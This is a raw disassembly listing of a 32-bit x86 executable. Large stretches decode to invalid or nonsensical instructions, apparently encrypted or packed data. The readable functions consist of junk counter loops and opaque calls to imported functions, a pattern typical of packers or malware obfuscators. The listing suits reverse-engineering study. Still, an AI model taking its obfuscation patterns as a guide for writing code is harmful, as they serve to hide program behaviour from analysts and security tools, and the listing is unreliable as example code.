  40310a:	add    cl,BYTE PTR [esi-0x9]
  40310d:	out    0x3d,al
  40310f:	cmp    ecx,DWORD PTR [eax]
  403111:	pushf  
  403112:	cmp    dh,BYTE PTR [esi-0x4c41c576]
  403118:	xchg   ecx,eax
  403119:	(bad)  [ebx]
  40311b:	dec    ebp
  40311c:	pop    ds
  40311d:	inc    edx
  40311e:	xchg   ebp,eax
  40311f:	and    eax,0x172460a0
  403124:	cmc    
  403125:	push   cs
  403126:	dec    eax
  403127:	push   ebx
  403128:	nop
  403129:	adc    al,0x2d
  40312b:	xchg   esp,eax
  40312c:	pop    esi
  40312d:	dec    esi
  40312e:	add    DWORD PTR [eax-0x3df7913b],esp
  403134:	sub    bl,al
  403136:	aad    0x52
  403138:	(bad)  
  40313a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40313b:	sbb    edi,edi
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shr    DWORD PTR [esi],0xe1
  40315e:	jmp    0x4030f1
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x403178
  403169:	std    
  40316a:	xchg   ebp,eax
  40316b:	xchg   esp,eax
  40316c:	dec    ebp
  40316d:	inc    eax
  40316e:	fidiv  WORD PTR [esi+0x53]
  403171:	pushf  
  403172:	cmp    esi,DWORD PTR [edx]
  403174:	ds mov bx,0x1cd8
  403179:	fsub   DWORD PTR ds:0xd48980c1
  40317f:	dec    edx
  403180:	scas   eax,DWORD PTR es:[edi]
  403181:	lds    esi,FWORD PTR [esp+eax*4]
  403184:	inc    eax
  403185:	adc    DWORD PTR [edx+0x63],eax
  403188:	mov    dh,0xc2
  40318a:	fwait
  40318b:	retf   
  40318c:	sbb    eax,0xd514f2e7
  403191:	adc    eax,0xf9912b58
  403196:	cmp    dh,BYTE PTR [edx-0x2f]
  403199:	pop    ebp
  40319a:	ins    BYTE PTR es:[edi],dx
  40319b:	ins    BYTE PTR es:[edi],dx
  40319c:	in     eax,dx
  40319d:	sub    al,0x6c
  40319f:	out    0xa2,eax
  4031a1:	pop    eax
  4031a2:	xchg   esp,esp
  4031a4:	jmp    0xaeb882d8
  4031a9:	call   0xdce676a9
  4031ae:	call   0x93566b76
  4031b3:	inc    esi
  4031b4:	xchg   BYTE PTR [ecx-0x237df44f],dh
  4031ba:	stc    
  4031bb:	jge    0x4031df
  4031bd:	repz shl DWORD PTR [ecx+ecx*1-0x27],1
  4031c2:	ficom  WORD PTR [esi]
  4031c4:	jge    0x403240
  4031c6:	mov    dh,0x65
  4031c8:	les    ebp,FWORD PTR [edx]
  4031ca:	enter  0xf0c5,0x7a
  4031ce:	gs stos BYTE PTR es:[edi],al
  4031d0:	jno    0x4031cf
  4031d2:	test   al,0x47
  4031d4:	retf   
  4031d5:	fidivr WORD PTR [edx-0x2fb0b2f5]
  4031db:	jne    0x4031f7
  4031dd:	popf   
  4031de:	shl    BYTE PTR [ebp-0xd4f0f95],cl
  4031e4:	aam    0x41
  4031e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e7:	fild   QWORD PTR [edi+0x59]
  4031ea:	aad    0x87
  4031ec:	daa    
  4031ed:	popf   
  4031ee:	data16 aas 
  4031f0:	nop
  4031f1:	sub    eax,0xa50e8239
  4031f6:	add    esi,DWORD PTR [esi+0x5b]
  4031f9:	jno    0x403192
  4031fb:	and    DWORD PTR [eax],eax
  4031fd:	jl     0x4031ba
  4031ff:	add    ch,BYTE PTR ds:0x8ff0e1c5
  403205:	mov    ebp,0x6273b7de
  40320a:	inc    ecx
  40320b:	js     0x403212
  40320d:	test   al,0xbe
  40320f:	sub    eax,0xa58c2c0c
  403214:	fcmovne st,st(1)
  403216:	test   al,0x4b
  403218:	sahf   
  403219:	fiadd  DWORD PTR [bp+si+0x7998]
  40321e:	push   eax
  40321f:	jns    0x403293
  403221:	pop    esi
  403222:	inc    eax
  403223:	or     DWORD PTR ss:[edi-0x6ee99a9d],esp
  40322a:	mov    bl,0xa5
  40322d:	inc    edx
  40322e:	fmul   st(6),st
  403230:	in     al,0x21
  403232:	push   ebx
  403233:	les    edx,FWORD PTR [edx+esi*2]
  403236:	jmp    0x4032a1
  403238:	sti    
  403239:	fdiv   DWORD PTR [eax-0x8]
  40323c:	push   edi
  40323d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40323e:	mov    eax,0x6b46c2b3
  403243:	cdq    
  403244:	mov    bh,BYTE PTR [ebp+0x2]
  403247:	xchg   edx,eax
  403248:	mov    ebp,0x5c83a5eb
  40324d:	ins    BYTE PTR es:[edi],dx
  40324e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40324f:	dec    esi
  403250:	ins    DWORD PTR es:[edi],dx
  403251:	scas   eax,DWORD PTR es:[edi]
  403252:	xchg   ebp,eax
  403253:	or     DWORD PTR [ebp-0x4ac93ed],edx
  403259:	popf   
  40325a:	push   esi
  40325b:	daa    
  40325c:	data16 and al,0xee
  40325f:	or     DWORD PTR [esi],ebp
  403261:	xchg   ecx,eax
  403262:	cwde   
  403263:	or     al,0xb4
  403265:	jae    0x403269
  403267:	fnstenv [edi+0x2c98231e]
  40326d:	mov    ds:0x7f4cf0cf,al
  403272:	or     esp,DWORD PTR [ecx]
  403274:	retf   0x7f8a
  403277:	out    0xdb,eax
  403279:	push   edi
  40327a:	adc    ch,BYTE PTR [edx]
  40327c:	shl    DWORD PTR [eax+0x1ac3cf92],cl
  403282:	xor    al,0xb5
  403284:	(bad)  
  403286:	push   esi
  403287:	stos   BYTE PTR es:[edi],al
  403288:	dec    ebx
  403289:	cs (bad) 
  40328b:	stos   BYTE PTR es:[edi],al
  40328c:	in     al,dx
  40328d:	add    al,0x1c
  40328f:	pop    es
  403290:	retf   
  403291:	leave  
  403292:	cwde   
  403293:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403295:	addr16 pop es
  403297:	lds    eax,FWORD PTR [ebp-0xf]
  40329a:	ficom  WORD PTR [esi-0x80]
  40329d:	lods   al,BYTE PTR ds:[esi]
  40329e:	and    eax,0xbf583533
  4032a3:	scas   eax,DWORD PTR es:[edi]
  4032a4:	cs loope 0x40323b
  4032a7:	mov    esi,edx
  4032a9:	(bad)  
  4032aa:	jmp    0x6dd1:0xc9863bd8
  4032b1:	cmp    eax,0x3951ee61
  4032b6:	dec    edx
  4032b7:	aaa    
  4032b8:	fsubr  DWORD PTR [eax-0x78b1a0cc]
  4032be:	ja     0x4032a2
  4032c0:	lds    eax,FWORD PTR [eax-0x1709478e]
  4032c6:	sbb    edi,DWORD PTR [eax+0x4892c59d]
  4032cc:	pop    esp
  4032cd:	pushf  
  4032ce:	fbstp  TBYTE PTR [ebp-0x6c]
  4032d1:	pop    esp
  4032d2:	sbb    ebx,eax
  4032d4:	cld    
  4032d5:	std    
  4032d6:	das    
  4032d7:	sbb    edi,eax
  4032d9:	inc    edi
  4032da:	dec    edx
  4032db:	or     bh,dh
  4032dd:	stc    
  4032de:	pop    esi
  4032df:	test   bh,dh
  4032e1:	jne    0x40334e
  4032e3:	ins    BYTE PTR es:[edi],dx
  4032e4:	in     eax,dx
  4032e5:	jae    0x403331
  4032e7:	sbb    ah,BYTE PTR [esi-0x51]
  4032ea:	loopne 0x4032f6
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x806d48a]
  403537:	or     BYTE PTR [edi-0x3a],dl
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	xor    eax,0xef6fda58
  403546:	mov    dl,BYTE PTR [eax+esi*4-0x1ad513b2]
  40354d:	stos   BYTE PTR es:[edi],al
  40354e:	mov    dh,0xb6
  403550:	dec    esp
  403551:	fdivr  st(3),st
  403553:	int3   
  403554:	fs push edi
  403556:	in     al,0x96
  403558:	add    BYTE PTR [ecx],ah
  40355a:	push   eax
  40355b:	fiadd  DWORD PTR [ebx-0x671b7ffd]
  403561:	aas    
  403562:	xchg   edx,eax
  403563:	xchg   ebp,eax
  403564:	outs   dx,DWORD PTR ds:[esi]
  403565:	fisubr DWORD PTR [edx]
  403567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403568:	jmp    0x403579
  40356a:	cwde   
  40356b:	jmp    0x40350d
  40356d:	mov    cl,0x87
  40356f:	int    0x9b
  403571:	add    cl,BYTE PTR [esi-0x41]
  403574:	leave  
  403575:	(bad)  
  403576:	fmul   QWORD PTR [esi-0x5c47d882]
  40357c:	retf   0x2eec
  40357f:	inc    edx
  403580:	jp     0x40353e
  403582:	jmp    0xf87a:0x98d0658
  403589:	adc    ch,BYTE PTR [eax]
  40358b:	cmc    
  40358c:	cld    
  40358d:	jb     0x40356d
  40358f:	arpl   WORD PTR [eax+0x66],di
  403592:	leave  
  403593:	cmc    
  403594:	mov    bh,0xc9
  403596:	xor    al,BYTE PTR [edx-0x7]
  403599:	mov    ebx,DWORD PTR [ebx+0x157aefc6]
  40359f:	pop    es
  4035a0:	(bad)  [esi]
  4035a2:	sbb    eax,0xadab0a69
  4035a7:	adc    BYTE PTR [edi-0xde734c],ch
  4035ad:	aad    0x7
  4035af:	cmp    edi,edx
  4035b1:	fisubr WORD PTR [ebp-0x76]
  4035b4:	ja     0x4035c5
  4035b6:	pusha  
  4035b7:	(bad)  
  4035b8:	dec    edi
  4035b9:	dec    ebx
  4035ba:	btr    edi,ecx
  4035bd:	das    
  4035be:	mov    eax,ds:0xe5f8c297
  4035c3:	call   0xbb9c9556
  4035c8:	xchg   ecx,eax
  4035c9:	scas   eax,DWORD PTR es:[edi]
  4035ca:	ins    BYTE PTR es:[edi],dx
  4035cb:	jmp    0x403595
  4035cd:	stos   BYTE PTR es:[edi],al
  4035ce:	cmp    edx,ebp
  4035d0:	mov    eax,0x9dc99a1f
  4035d5:	(bad)  
  4035d6:	hlt    
  4035d7:	inc    ebp
  4035d8:	pop    ss
  4035d9:	std    
  4035da:	xchg   esi,eax
  4035db:	or     ebx,DWORD PTR [ecx-0x1]
  4035de:	inc    ebx
  4035df:	sub    cl,BYTE PTR [edx+0x4f]
  4035e2:	gs pop ecx
  4035e4:	pop    ds
  4035e5:	test   BYTE PTR [esi-0x52efeb5f],0x58
  4035ec:	outs   dx,DWORD PTR es:[esi]
  4035ee:	test   DWORD PTR [edx-0x1c71982a],eax
  4035f4:	dec    eax
  4035f5:	jl     0x403645
  4035f7:	mov    ch,0x78
  4035f9:	xchg   esi,eax
  4035fa:	(bad)  
  4035fb:	mov    ebx,0xc5c9b437
  403600:	add    bl,bh
  403602:	mov    esi,0x2769c44d
  403607:	jns    0x40359c
  403609:	jo     0x4035e7
  40360b:	dec    ebx
  40360c:	imul   edx,DWORD PTR ds:0x40d1f251,0xe3fdda32
  403616:	jl     0x403645
  403618:	push   es
  403619:	mov    eax,0x85603b32
  40361e:	inc    ebx
  40361f:	ret    0x3b67
  403622:	pop    edx
  403623:	retf   0xce94
  403626:	inc    edi
  403627:	js     0x403600
  403629:	or     eax,0xe463f704
  40362e:	call   0x3f46821a
  403633:	aam    0x37
  403635:	frstor ds:0x32d03cb2
  40363b:	into   
  40363c:	mov    ch,0xd8
  40363e:	sbb    BYTE PTR [ecx],ah
  403640:	addr16 je 0x403671
  403643:	std    
  403644:	or     eax,0xc2fbd320
  403649:	mov    eax,ds:0x97a90590
  40364e:	iret   
  40364f:	cmc    
  403650:	push   esp
  403651:	mov    edi,0xc8486bee
  403656:	pop    ecx
  403657:	ins    DWORD PTR es:[edi],dx
  403658:	mov    ?,esi
  40365a:	stos   BYTE PTR es:[edi],al
  40365b:	out    0xd5,al
  40365d:	adc    eax,0x67b3520f
  403662:	mov    ebp,0x176c5b8d
  403667:	or     BYTE PTR [edx+ebx*8],ch
  40366a:	mov    esi,0x493dab05
  40366f:	leave  
  403670:	call   0x8c274795
  403675:	pop    bp
  403677:	push   0x99db8c13
  40367c:	or     eax,0x7ce7ed94
  403681:	mov    esi,0xd88649fa
  403686:	push   0xfffffff3
  403688:	xchg   DWORD PTR [edx+0x3a],ebx
  40368b:	xchg   ecx,eax
  40368c:	icebp  
  40368d:	ins    BYTE PTR es:[edi],dx
  40368e:	xor    BYTE PTR ds:[esi+0x20],0xdf
  403693:	jno    0x403670
  403695:	das    
  403696:	mov    edx,0xeb75e6d9
  40369b:	xchg   esp,esp
  40369d:	adc    ch,BYTE PTR [ecx-0x58826b99]
  4036a3:	push   es
  4036a4:	inc    edi
  4036a5:	push   ebp
  4036a6:	cmp    BYTE PTR [edi],bh
  4036a8:	jmp    0x4036af
  4036aa:	in     al,dx
  4036ab:	call   0xe62acafd
  4036b0:	rol    BYTE PTR [eax+0x192bbea],0x62
  4036b7:	cmp    al,0xc1
  4036b9:	loopne 0x40372b
  4036bb:	aad    0x1c
  4036bd:	cwde   
  4036be:	in     al,0xcb
  4036c0:	out    dx,eax
  4036c1:	push   ecx
  4036c2:	push   ebx
  4036c3:	aad    0x5a
  4036c5:	jmp    0xff0a2914
  4036ca:	mov    esp,0x2fb5df8e
  4036cf:	and    eax,esp
  4036d1:	dec    si
  4036d3:	add    al,0x71
  4036d5:	sub    BYTE PTR [ecx+0x5a14f95a],dh
  4036db:	test   BYTE PTR [ebx+0x49c22939],0x46
  4036e2:	sbb    al,0x59
  4036e4:	inc    edi
  4036e5:	in     al,dx
  4036e6:	retf   
  4036e7:	out    0x9,eax
  4036e9:	push   esi
  4036ea:	jnp    0x4036bf
  4036ec:	lods   al,BYTE PTR ds:[esi]
  4036ed:	pop    eax
  4036ee:	aad    0x87
  4036f0:	inc    ecx
  4036f1:	imul   ebp,DWORD PTR [esi+0x16],0x4e
  4036f5:	je     0x4036e3
  4036f7:	mov    BYTE PTR [edx+0x78d53e18],ah
  4036fd:	icebp  
  4036fe:	in     eax,dx
  4036ff:	jnp    0x4036a2
  403701:	push   edi
  403702:	cmp    DWORD PTR [edx+0x60],eax
  403705:	movlps QWORD PTR [ebx-0x2f],xmm1
  403709:	pop    ecx
  40370a:	xor    al,0x38
  40370c:	xstore-rng (bad)
  40370d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40370e:	xor    BYTE PTR [eax-0x55],0xaf
  403712:	psrlw  mm4,QWORD PTR [esi-0x610c0225]
  403719:	mov    BYTE PTR [eax-0x63],dl
  40371c:	dec    edx
  40371d:	mov    WORD PTR [edx+eax*8+0x1],es
  403721:	xor    eax,0xe7e0daa1
  403726:	in     al,0x1f
  403728:	add    cl,ah
  40372a:	aas    
  40372b:	inc    ebp
  40372c:	mov    edx,edx
  40372e:	les    edi,FWORD PTR [esi-0x36cf7ec3]
  403734:	div    BYTE PTR [edx]
  403736:	aam    0x23
  403738:	jecxz  0x403722
  40373a:	sahf   
  40373b:	jle    0x4036ef
  40373d:	xchg   esp,ecx
  40373f:	(bad)  
  403740:	lds    eax,FWORD PTR [edx-0x3f]
  403743:	adc    DWORD PTR [edx-0x46e6180f],esi
  403749:	out    dx,al
  40374a:	sub    edx,DWORD PTR [ecx-0x3a3b6035]
  403750:	sbb    eax,0x8546b0fd
  403755:	adc    eax,0x45e5a771
  40375a:	call   0xbb62:0xb4da7151
  403761:	loopne 0x4036e7
  403763:	rep stos BYTE PTR es:[edi],al
  403765:	add    BYTE PTR [esi-0x60dce0fe],cl
  40376b:	xchg   edi,eax
  40376c:	push   ds
  40376d:	inc    ebp
  40376e:	in     eax,dx
  40376f:	xchg   BYTE PTR [esp+ebp*2-0x34],dl
  403773:	out    dx,al
  403774:	mov    ah,0xad
  403776:	cmp    al,0x94
  403778:	stos   BYTE PTR es:[edi],al
  403779:	mov    cl,0xc1
  40377b:	xchg   esp,eax
  40377c:	jl     0x4037b4
  40377e:	mov    ch,0x8c
  403780:	es fs mov esp,edi
  403784:	fld    TBYTE PTR [ebx]
  403786:	jnp    0x4037d0
  403788:	cmc    
  403789:	repnz test BYTE PTR ds:0xb3e0e530,dl
  403790:	repz leave 
  403792:	jge    0x4037f0
  403794:	push   edi
  403795:	inc    ebp
  403796:	cmc    
  403797:	jmp    0x7a36:0xfab345a3
  40379e:	xacquire xchg BYTE PTR [edi],ah
  4037a1:	sbb    BYTE PTR [edx+ebp*4+0xded3efb],0x52
  4037a9:	mov    al,0x57
  4037ab:	clc    
  4037ac:	jge    0x403787
  4037ae:	and    esp,DWORD PTR [ebp+0x73e21120]
  4037b4:	jmp    0x5cf5c5f5
  4037b9:	call   DWORD PTR [ebx]
  4037bb:	xor    dl,BYTE PTR [esi+0x45]
  4037be:	xchg   esp,eax
  4037bf:	and    eax,0x87c153be
  4037c4:	push   ebx
  4037c5:	jmp    0x4037f1
  4037c7:	adc    al,0x4
  4037c9:	cmp    bl,ch
  4037cb:	mov    bh,0xc7
  4037cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ce:	es nop
  4037d0:	dec    ecx
  4037d1:	cmp    bh,BYTE PTR [esi-0x3323485d]
  4037d7:	fisub  DWORD PTR [ebp-0x957a180]
  4037dd:	psubw  mm0,QWORD PTR [eax]
  4037e0:	pop    edi
  4037e1:	xchg   esp,eax
  4037e2:	xchg   BYTE PTR [ebp+0x63],bh
  4037e5:	or     al,0xc8
  4037e7:	adc    eax,0xcac7d555
  4037ec:	push   ecx
  4037ed:	jge    0x4037d0
  4037ef:	call   0xa5e96455
  4037f4:	xchg   ebp,eax
  4037f5:	pop    es
  4037f6:	(bad)  
  4037f7:	xor    ch,bl
  4037f9:	mov    edx,0xe3323ed6
  4037fe:	push   ds
  4037ff:	lods   al,BYTE PTR ds:[esi]
  403800:	mov    ecx,0x9835f37
  403805:	or     al,0xae
  403807:	push   ds
  403808:	push   ds
  403809:	add    al,0x4a
  40380b:	jns    0x4037b8
  40380d:	ss test al,0x8b
  403810:	mov    ebp,0x7e6a0212
  403815:	add    bl,dh
  403817:	test   eax,0x62137af3
  40381c:	rcr    BYTE PTR [esi+0x58ad8893],cl
  403822:	test   al,0x8d
  403824:	xor    al,BYTE PTR [ebx-0x3bba38d9]
  40382a:	cmp    BYTE PTR [ebp+0x3d1bf89c],al
  403830:	jnp    0x403869
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	sub    edi,DWORD PTR [eax]
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x4338a725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
